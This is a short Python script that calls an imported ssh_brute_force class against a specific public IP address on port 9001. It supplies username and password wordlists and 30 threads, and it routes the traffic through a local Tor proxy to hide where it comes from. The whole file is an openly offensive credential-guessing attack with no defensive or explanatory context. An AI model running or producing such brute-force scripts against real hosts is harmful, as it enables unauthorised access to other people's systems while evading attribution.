from ssh_class import ssh_brute_force
 
obj = ssh_brute_force(ip='185.183.11.129',port=9001,users='./usernames.txt',passes='./usernames.txt',threads=30,proxies=[['127.0.0.1',9050]])
obj.RUN()
